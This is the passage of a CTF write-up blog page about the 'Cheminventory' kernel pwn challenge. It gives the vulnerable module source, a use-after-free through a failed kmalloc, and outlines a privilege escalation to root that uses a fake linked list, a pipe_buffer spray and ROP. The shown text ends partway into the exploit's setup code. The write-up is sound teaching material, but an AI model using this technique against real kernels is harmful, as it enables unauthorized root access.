@@ -1,0 +1,1002 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>Kernels and Cats</title>
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+    <meta content="utf-8" http-equiv="encoding">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="theme-color" content="#000084" />
+    <meta name="google-site-verification" content="733C7I2uDZnatcput9zZupeQ_PX5Z0BJ1HmTnGi0SJI" />
+    <link rel="icon" href="http://localhost:1313//favicon.ico">
+    <link rel="canonical" href="http://localhost:1313/">
+    
+    
+</head>
+<body>
+<nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="navbar-inner">
+        <div class="container">
+            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
+            <a class="brand" href="http://localhost:1313/">Kernels and Cats</a>
+            <div class="nav-collapse collapse">
+                <ul class="nav">
+                    
+                    
+                        
+                            <li>
+                                <a href="/about/">
+                                    
+                                    <span>About</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/post/">
+                                    
+                                    <span>All posts</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/challenges/">
+                                    
+                                    <span>CTF Challenges</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/random-facts/">
+                                    
+                                    <span>Random Fun Facts</span>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</nav><div id="content" class="container">
+
+<div class="row-fluid navmargin">
+    <div class="page-header">
+        <h1>Cheminventory [Lag and Crash 4.0] - Sun, Mar 17, 2024</h1>
+    </div>
+    <p class="lead"></p>
+    <h4 id="tldr">TLDR</h4>
+<p>Cheminventory is a kernel pwn challenge dealing with a UAF on an object that is part of a linked list. The UAF could be triggered by allocating more memory than kmalloc is able to service, which would then cause kmalloc to fail, and for the struct chemical object to be freed while it is still part of the linked list. The tricky part of this challenge lies in the exploitation as kernel list protections will perform checks when unlinking objects, hence in order to attain a better primitive such as the ability to free an object, a fake linked list must be forged using controllable objects. Once an arbitrary free on a kmalloc-cg-1024 object has been achieved, the classic pipe_buf spray and RIP control can be used together with a ROP chain to gain root :D</p>
+<h4 id="table-of-contents">Table of Contents</h4>
+<ol>
+<li><a href="#the-story-behind-cheminventory">The Story Behind Cheminventory</a></li>
+<li><a href="#module-functionality">Module Functionality</a></li>
+<li><a href="#setup">Setup</a></li>
+<li><a href="#trigger-cross-cache-and-kernel-text-leak">Trigger, Cross Cache and Kernel Text Leak</a></li>
+<li><a href="#fake-linked-list-overview">Fake Linked List Overview</a></li>
+<li><a href="#kernel-heap-leak">Kernel Heap Leak</a></li>
+<li><a href="#building-the-fake-linked-list">Building the Fake Linked List</a></li>
+<li><a href="#rop-time">ROP Time!!!</a></li>
+</ol>
+<h4 id="the-story-behind-cheminventory">The Story Behind Cheminventory</h4>
+<p>Once upon a time, I was having a friendly chat with gatari, and while talking about pwn, this happened:</p>
+<p><img src="/images/cheminventory/mallocallmemory.jpg" alt="Malloc all memory???"></p>
+<p>And he responded:</p>
+<p><img src="/images/cheminventory/whatifwemallocitall.jpg" alt="What if we malloc it all????"></p>
+<p>At that time, he asked if I was interested in writing challenges for LNC 4.0, and I haven&rsquo;t thought of anything cursed enough to turn into a challenge yet, so I wondered: what if I make a kernel challenge where the bug is triggered by trying to malloc a stupidly huge amount of memory 🤔</p>
+<p>Coupled with having to deal with kernel list_head structs in the past and my uni lab project (I am actually a chemist 🧪), as well as some of my other friends telling me I should name it after some funny Chemistry thing, Cheminventory came to life!</p>
+<p>Originally I wanted to do some sort of dlmalloc unlinking attack kind of thing (see <a href="https://www.youtube.com/watch?v=HWhzH--89UQ">LiveOverflow&rsquo;s Youtube Video</a>), where you could turn the list unlink into some sort of arbitrary write, but then I got skill issued by the kernel list protections 💀. There was a point where exploitation got so finnicky that I wanted to make this challenge way easier by introducing a new kernel module ioctl with an exec function which will execute a function whose address would be in struct chemical (and hence RIP control would be as easy as putting your ROP gadget there and calling exec), but I felt that this would have taken away the <del>cyberbullying spirit</del> charm of the challenge, so I decided to make the challenge about bypassing kernel list protections by forging a fake linked list using msg_msg objects. This exploit actually took me some time to write and was extremely fussy, and not only did I get skill issued by my own challenge, my VM also decided to skill issue me during the CTF dry run day when it refused to copy my base64-ed exploit into the challenge QEMU instance for a long time 💀💀💀</p>
+<p>Another fun fact: Cheminventory actually exists! It is an actual lab management software (<a href="https://www.cheminventory.net/">https://www.cheminventory.net/</a>) for taking stock of what chemicals your lab has and where they are stored (so that people can find them amongst the tons of different chemical bottles in the lab):</p>
+<p><img src="/images/cheminventory/actual_cheminventory.jpg" alt="Cheminventory!"></p>
+<h4 id="module-functionality">Module Functionality</h4>
+<p>The module has 4 functions: DO_CREATE, DO_REPLACE, DO_READ, and DO_DELETE, all which perform actions involving struct chemical objects.</p>
+<p>A struct chemical has a size of 256, and has the following components:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> chemical { 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">0xc8</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> quantity;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> cas;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> idx;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> list_head list;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> note_size; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> note_addr;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>(Fun fact: A CAS number is also an actual thing! Most chemicals are assigned a CAS number, which is a unique 10 digit identifier separated into 3 parts by 2 hyphens. For example, the CAS number of benzene ⌬ is 71-43-2.)</p>
+<p>The user can interact with the cheminventory module via ioctl, which takes in the following struct:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> req {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> quantity; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> cas;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> idx;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> note_size;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> note_addr;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> name_addr;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>There are unfortunately (well hopefully) no race conditions in this module, as locks are taken when the ioctl functions are being run.</p>
+<p><strong>DO_CREATE: 0xc030ca00</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DO_CREATE: {           
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (user_data.note_size <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">||</span> user_data.note_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;A chemical explosion occurred. Oh no!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>chem_mutex);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            chem <span style="color:#f92672">=</span> <span style="color:#a6e22e">kmalloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> chemical), GFP_KERNEL);
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Quantity
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            chem<span style="color:#f92672">-&gt;</span>quantity <span style="color:#f92672">=</span> user_data.quantity;
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// CAS
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            chem<span style="color:#f92672">-&gt;</span>cas <span style="color:#f92672">=</span> user_data.cas;
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// idx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            chem<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">=</span> chemical_count; 
+</span></span><span style="display:flex;"><span>            chemical_count <span style="color:#f92672">=</span> chemical_count <span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// list_head
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">list_add_tail</span>(<span style="color:#f92672">&amp;</span>chem<span style="color:#f92672">-&gt;</span>list, <span style="color:#f92672">&amp;</span>chemical_head);
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// note_addr 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            chem<span style="color:#f92672">-&gt;</span>note_size <span style="color:#f92672">=</span> user_data.note_size; 
+</span></span><span style="display:flex;"><span>            note <span style="color:#f92672">=</span> <span style="color:#a6e22e">kmalloc</span>(user_data.note_size, GFP_KERNEL_ACCOUNT);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">memset</span>(note, <span style="color:#ae81ff">0</span>, user_data.note_size);
+</span></span><span style="display:flex;"><span>            chem<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>) note;
+</span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(buf, (<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>) user_data.note_addr, user_data.note_size<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">memcpy</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) note, buf, user_data.note_size<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); 
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// name_addr 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(buf, (<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>) user_data.name_addr, <span style="color:#ae81ff">0xc8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">memcpy</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) chem<span style="color:#f92672">-&gt;</span>name, buf, <span style="color:#ae81ff">0xc8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); 
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>chem_mutex);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span></code></pre></div><p>DO_CREATE will allocate a new struct chemical object in kmalloc-256. The quantity and CAS number provided by the user will be filled in, and the chemical will be assigned an index number. The struct chemical will then be added to a linked list of chemicals (this will be important later!).</p>
+<p>The user also has the ability to allocate a note (size is restricted between 0 and 100; this is also important later), and the note object will be allocated with GFP_KERNEL_ACCOUNT (in a cg cache). The size of the note as well as its address will be stored in the struct chemical object. Finally, the name of the chemical will be copied into struct chemical.</p>
+<p><strong>DO_REPLACE: 0xc030ca01 and the Bug 🪲</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DO_REPLACE: {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (user_data.note_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;A chemical explosion occurred. Oh no!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>chem_mutex);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">list_for_each</span>(ptr, <span style="color:#f92672">&amp;</span>chemical_head) {
+</span></span><span style="display:flex;"><span>                entry <span style="color:#f92672">=</span> <span style="color:#a6e22e">list_entry</span>(ptr, <span style="color:#66d9ef">struct</span> chemical, list);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (entry<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">==</span> user_data.idx) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">kfree</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) entry<span style="color:#f92672">-&gt;</span>note_addr);
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">list_del</span>(<span style="color:#f92672">&amp;</span>entry<span style="color:#f92672">-&gt;</span>list); 
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">kfree</span>(entry);
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;Replacing chemical at index %lld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, user_data.idx);
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                    chem <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> chemical), GFP_KERNEL); 
+</span></span><span style="display:flex;"><span>                    chem<span style="color:#f92672">-&gt;</span>quantity <span style="color:#f92672">=</span> user_data.quantity;
+</span></span><span style="display:flex;"><span>                    chem<span style="color:#f92672">-&gt;</span>cas <span style="color:#f92672">=</span> user_data.cas;
+</span></span><span style="display:flex;"><span>                    chem<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">=</span> user_data.idx; 
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">list_add_tail</span>(<span style="color:#f92672">&amp;</span>chem<span style="color:#f92672">-&gt;</span>list, <span style="color:#f92672">&amp;</span>chemical_head); 
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// New note
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    note <span style="color:#f92672">=</span> <span style="color:#a6e22e">kmalloc</span>(user_data.note_size, GFP_KERNEL_ACCOUNT); 
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (note <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">kfree</span>(chem); 
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;A chemical explosion occurred. Oh no!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>chem_mutex);
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (user_data.note_size <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span>) { 
+</span></span><span style="display:flex;"><span>                        chem<span style="color:#f92672">-&gt;</span>note_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>;
+</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                        chem<span style="color:#f92672">-&gt;</span>note_size <span style="color:#f92672">=</span> user_data.note_size; 
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">memset</span>(note, <span style="color:#ae81ff">0</span>, chem<span style="color:#f92672">-&gt;</span>note_size);
+</span></span><span style="display:flex;"><span>                    chem<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>) note;
+</span></span><span style="display:flex;"><span>                    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(buf, (<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>) user_data.note_addr, user_data.note_size<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">memcpy</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) note, buf, user_data.note_size<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); 
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// name_addr 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">memset</span>(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>                    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(buf, (<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>) user_data.name_addr, <span style="color:#ae81ff">0xc8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">memcpy</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) chem<span style="color:#f92672">-&gt;</span>name, buf, <span style="color:#ae81ff">0xc8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); 
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>chem_mutex);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>chem_mutex);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span></code></pre></div><p>Basically what replace does is that it will swap out an old struct chemical object with a new one for the chemical at the index specified by the user.</p>
+<p>The module will first walk through the linked list to find the chemical with an index matching the index specified by the user. That struct chemical object would then be unlinked from the list, and freed. The module would then allocate a new struct chemical object, and fill in the quantity, cas number, and index number as usual. Once that is done, the new struct chemical object would be linked into the linked list.</p>
+<p>The module then tries to allocate a note object with the size specified by the user. If kmalloc fails, it will return null, and the struct chemical object would be freed. Hmmmm&hellip; What could possibly go wrong???</p>
+<p>If kmalloc fails, and the struct chemical object is freed, it is still linked to the linked list! This means that if we are somehow able to reach that code path, we would be looking at a very nice use-after-free bug.</p>
+<p>But how could we possibly force kmalloc to fail? We could kmalloc(0), but that would result in kmalloc returning ZERO_SIZE_PTR (<a href="https://lwn.net/Articles/236809/">https://lwn.net/Articles/236809/</a>) instead of NULL. Note that the kernel module also checks that the user does not attempt to create a note with size 0 when attempting to replace a chemical object. (I also thought that allocating no memory was less funny than allocating a crap ton of memory, hence I blocked it XD)</p>
+<p>However, note that DO_REPLACE does not check that the note size is smaller than 100 before creating a new chemical object! This means that theoretically, we could attempt to kmalloc any size above 0. To make kmalloc 💥 combust 💥, we can simply try to <strong>allocate all possible memory on the machine</strong> :O!!!!!!</p>
+<p><strong>DO_READ: 0xc030ca02</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DO_READ: {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">list_for_each</span>(ptr, <span style="color:#f92672">&amp;</span>chemical_head) {
+</span></span><span style="display:flex;"><span>                entry <span style="color:#f92672">=</span> <span style="color:#a6e22e">list_entry</span>(ptr, <span style="color:#66d9ef">struct</span> chemical, list);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (entry<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">==</span> user_data.idx) {
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (entry<span style="color:#f92672">-&gt;</span>note_size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">100</span>) {
+</span></span><span style="display:flex;"><span>                        ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_user</span>((<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>)user_data.note_addr, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) entry<span style="color:#f92672">-&gt;</span>note_addr, entry<span style="color:#f92672">-&gt;</span>note_size);
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_user</span>((<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>)user_data.name_addr, <span style="color:#f92672">&amp;</span>entry<span style="color:#f92672">-&gt;</span>name, <span style="color:#ae81ff">0xc8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>chem_mutex);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>chem_mutex);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span></code></pre></div><p>The read function will simply read from the note buffer (up to a length of the size of the note) and the chemical name buffer, and return that information to the user. This functionality will be very useful for leaks :D</p>
+<p><strong>DO_DELETE: 0xc030ca03</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DO_DELETE: {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">list_for_each</span>(ptr, <span style="color:#f92672">&amp;</span>chemical_head) {
+</span></span><span style="display:flex;"><span>                entry <span style="color:#f92672">=</span> <span style="color:#a6e22e">list_entry</span>(ptr, <span style="color:#66d9ef">struct</span> chemical, list);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (entry<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">==</span> user_data.idx) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">list_del</span>(<span style="color:#f92672">&amp;</span>entry<span style="color:#f92672">-&gt;</span>list); 
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">kfree</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) entry<span style="color:#f92672">-&gt;</span>note_addr);
+</span></span><span style="display:flex;"><span>                    entry<span style="color:#f92672">-&gt;</span>note_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; 
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">kfree</span>(entry);
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;Deleted chemical at index %lld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, user_data.idx);
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>chem_mutex);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>chem_mutex);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span></code></pre></div><p>The delete function will walk the linked list to find the chemical with the matching index number. That chemical will then be deleted, and the struct chemical object freed, along with its corresponding note object. Note that the delete function solely identifies which struct chemical object to delete via its index number.</p>
+<p><strong>Module Protections</strong></p>
+<p>The annoying part of this challenge actually has to do with the kernel protections that have been enabled. On top of the usual SMAP, SMEP, KPTI, and KASLR protections being enabled, the following extra protections were also used:</p>
+<ul>
+<li>CONFIG_STATIC_USERMODEHELPER (no modprobe path overwrite)</li>
+<li>CONFIG_SLAB_FREELIST_HARDENED and CONFIG_SLAB_FREELIST_RANDOM</li>
+<li>CONFIG_LIST_HARDENED &ndash; list protections; more on this later</li>
+<li>CONFIG_SECURITY_SELINUX</li>
+</ul>
+<h4 id="setup">Setup</h4>
+<p>We will first have to do some setup before we can begin exploitation. As usual, we will limit all actions to the same CPU, set up our message queues, sockets, struct pipe_buffers, and open the cheminventory device.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Initial setup</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">cpu_set_t</span> cpu;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CPU_ZERO</span>(<span style="color:#f92672">&amp;</span>cpu);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CPU_SET</span>(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>cpu);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">sched_setaffinity</span>(<span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">cpu_set_t</span>), <span style="color:#f92672">&amp;</span>cpu)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;sched_setaffinity&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set up message queues
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Setting up msg queues</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ((msqid[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">msgget</span>(IPC_PRIVATE, IPC_CREAT <span style="color:#f92672">|</span> <span style="color:#ae81ff">0666</span>)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msgget failed&#34;</span>);
